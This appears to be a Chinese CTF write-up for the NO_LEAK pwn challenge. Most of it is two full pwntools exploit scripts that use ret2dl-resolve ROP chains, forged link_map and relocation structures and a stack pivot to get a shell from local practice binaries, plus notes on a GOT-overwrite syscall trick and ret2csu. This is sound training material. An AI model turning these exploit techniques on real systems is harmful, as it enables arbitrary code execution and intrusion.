# NO_LEAK

题目来源:http://pwn.eonew.cn/challenge.php

乍一看保护，感觉妥妥的又是ret2dl？？？开了Full RELRO也就是让我们无法爆破got表。（虽然我本来就不会）

![8fVVAv](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/8fVVAv.png)

关于RET2DL这篇[文章](https://blog.csdn.net/panhewu9919/article/details/96425545)讲的很细节，还有贴代码.这题和bstack那题基本一样。。。

64位参考模板（需要地址泄露，这里用不了）

```python
#!/usr/bin/python
#coding:utf-8
import roputils
from pwn import *
#context.log_level = 'debug'

fpath = './bof'        #需要修改的地方：文件名、溢出偏移; 读取偏移0x100->  ?? ; gadget地址
offset = 112

rop = roputils.ROP(fpath)
addr_stage = rop.section('.bss') + 0x400
ptr_ret = rop.search(rop.section('.fini'))

main_addr=0x400676
pop6_addr=0x4007AA
call_addr=0x400790
write_got=0x601018
got_8=0x601008
buf = rop.retfill(offset)
buf += 'a'*8
buf += p64(pop6_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(got_8)+p64(1)+p64(call_addr)
buf += p64(0)*7
buf += p64(main_addr)
buf =  buf.ljust(0x100,'\x00')    #1.泄露&link_map地址，读取偏移0x100有待修改

p = process(fpath)
print p.recv()
p.send(buf)
addr_link_map = u64(p.recv(8))


buf = rop.retfill(offset)         #2.往bss段写入ROP链和伪造的结构
buf += 'a'*8
buf += rop.call_chain_ptr(
    #['write', 1, rop.got()+8, 8],
    ['read', 0, addr_stage, 500]   #400
, pivot=addr_stage)
buf=buf.ljust(0x100,'\x00')
p.send(buf)

#gdb.attach(p,'b *0x4006ab')
addr_dt_debug = addr_link_map + 0x1c8     #3.bss段的rop作用:往link_map+0x1c8写0; 同时往bss段写入伪造结构。
buf = rop.call_chain_ptr(
    ['read', 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+450]  #380
)
buf += rop.dl_resolve_call(addr_stage+300)
buf =  buf.ljust(300,'\x00')
buf += rop.dl_resolve_data(addr_stage+300, 'system')
buf =  buf.ljust(450,'\x00')   #380
buf += rop.string('/bin/sh')
buf =  buf.ljust(500,'\x00')

p.send(buf)
p.send(p64(0))      #写0
p.interactive()

'''
#for i in range(len(buf)/8):
#	print hex(u64(buf[8*i:8*(i+1)]))
#raw_input('wait!\n')
'''

```

64位，无地址泄露

```python
#!/usr/bin/python
#coding:utf-8
from pwn import *

#需修改:文件名、溢出偏移、gadget地址、各节地址
fpath = './bstack'
offset = 0x70
length = 0x100
stack_size = 0x800
main_addr=0x400676
p6_addr=0x40077A
call_addr=0x400760
leave_ret=0x00000000004006AB
p_rbp_ret=0x00000000004005e0
p_rdi_ret=0x0000000000400783

elf = ELF(fpath)
read_got=elf.got['read']
read_plt = elf.plt['read']
got_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008
bss_addr =elf.get_section_by_name('.bss').header.sh_addr
base_stage = bss_addr + stack_size
#print 'got_8=',hex(got_8)

#x/100xw  GOT[8]
fake_link_map=elf.got['__libc_start_main']    #change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
fake_st_value=0x4526a-0x20740    #0x4526a   0xf02a4     0xf1147
fake_r_offset=0x3c5720-0x20740
val_0x68=base_stage+0xc0-8    #0x600ea8
val_0x70=base_stage+0xc0-8    #0x600eb8
val_0xf8=base_stage+0xc0-8    #0x600f28
wait_time=0.1

def makecall(addr, rdi, rsi, rdx, tail = 0):
    payload = ''
    payload += p64(p6_addr)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(addr)
    payload += p64(rdx)
    payload += p64(rsi)
    payload += p64(rdi)
    payload += p64(call_addr)
    if (tail):
        payload += p64(0x0) * 7 + p64(tail)
    return payload

p = process(fpath)
#print p.recv()        # 'Welcome to XDCTF2015~!\n'

#1.往fake_link_map+0x68写值
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(read_got,0,fake_link_map+0x68,16,tail=main_addr)
payload=payload.ljust(0x100,'\x00')
p.send(payload)
sleep(wait_time)
p.send(p64(val_0x68)+p64(val_0x70))

#2.往fake_link_map+0xf8写值
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(read_got,0,fake_link_map+0xf8,8,tail=main_addr)
payload=payload.ljust(0x100,'\x00')
p.send(payload)
sleep(wait_time)
p.send(p64(val_0xf8))

#3.往base_stage写入伪造结构并跳过去
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(read_got,0,base_stage,0xd0,tail=0)   #假设结构大小是400
payload+=p64(0)*2+p64(base_stage)+p64(0)*4
payload+=p64(leave_ret)
payload=payload.ljust(0x100,'\x00')
p.send(payload)


#4.bss数据：rop-参数放在寄存器/ 伪造结构  
#(1)确定各个节的地址 
plt_0 = 0x0000000000400520 # objdump -d -j .plt bof
plt_1 = plt_0+6
#(2)确定重定位下标
align = 24 - (56 % 24)  # 这里的对齐操作是因为dynsym里的ELF64_R_SYM结构体都是24字节大小
index_offset = base_stage + 7*8 + align
index = (7*8 + align) / 24 # base_stage + 7*8 指向fake_reloc，减去rel_plt即偏移
#(3)确定动态链接符号下标
align = 24 - ((13*8) % 24)# 这里的对齐操作是因为dynsym里的Elf64_Sym结构体都是24字节大小
fake_sym_addr = base_stage + 13*8 + align
index_dynsym = (13*8 + align) / 24 # 除以24因为Elf64_Sym结构体的大小为24，得到write的dynsym索引号
#(4)伪造重定位结构+动态链接结构
r_info = (index_dynsym << 32) | 0x7
fake_reloc = p64(fake_r_offset) + p64(r_info) + p64(0)
fake_sym = p32(0) + p32(0x112) + p64(fake_st_value) + p64(0)

payload2 = p64(0)#'AAAAAAAA'
payload2 += p64(p_rdi_ret)
payload2 += p64(base_stage+0xc0)   #/bin/sh
payload2 += p64(plt_1)
payload2 += p64(fake_link_map)   #
payload2 += p64(index)       #jmprel 下标参数
payload2 += p64(0)       #返回地址

payload2 = payload2.ljust(index_offset-base_stage,'\x00')
payload2 += fake_reloc # index_offset(base_stage+7*8)的位置
payload2 = payload2.ljust(fake_sym_addr-base_stage,'\x00')
payload2 += fake_sym   # fake_sym_addr(base_stage+9*8)的位置
payload2 = payload2.ljust(0xc0,'\x00')
payload2 += p64(base_stage)
payload2 = payload2.ljust(0xd0,'\x00')

p.send(payload2)
p.interactive()


```

**方法二**

发现一个宝藏，通过got表覆盖来凑syscall。不过题目输入字符有限，直接改脚本没改成功。

https://www.4hou.com/posts/Q5rM



libc中的read代码中syscall距离函数开头只有0xf字节，而距离最近的ret只有0xa字节。可以用于构造一个syscall;ret的gadget，只要将read_got覆盖为0x*f就有16分一的机会能call到syscall。

![Q3pQ4g](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Q3pQ4g.png)



[**ret2csu**](https://xz.aliyun.com/t/4068)

![ZvEVG0](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/ZvEVG0.png)

![image-20200509165540521](/Users/migraine/Library/Application Support/typora-user-images/image-20200509165540521.png)